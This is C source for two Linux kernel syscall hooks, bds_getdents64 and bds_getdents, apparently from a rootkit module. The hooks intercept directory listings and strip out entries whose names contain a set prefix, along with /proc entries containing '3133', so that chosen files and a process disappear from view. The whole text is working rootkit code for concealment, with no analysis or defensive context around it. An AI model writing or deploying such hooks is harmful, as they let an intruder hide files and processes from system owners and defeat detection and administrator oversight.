static asmlinkage int bds_getdents64(const struct pt_regs *pt_regs) {
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
	int ret = orig_getdents64(pt_regs);
	int err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;
	
	if (ret <= 0)
		return ret;
	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;
	
	while (off < ret) {
		dir = (void *)kdirent + off;

		if ( (!proc && (strstr(dir->d_name, BDS_PREFIX)))
		|| (proc && (strstr(dir->d_name, "3133"))) ) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

static asmlinkage int bds_getdents(const struct pt_regs *pt_regs) {
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
	int ret = orig_getdents(pt_regs);
	int err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	
	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev) )
		proc = 1;
	while (off < ret) {
		dir = (void *)kdirent + off;
		if ( (!proc && (strstr(dir->d_name, BDS_PREFIX)))
		|| (proc && (strstr(dir->d_name, "3133"))) ) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}
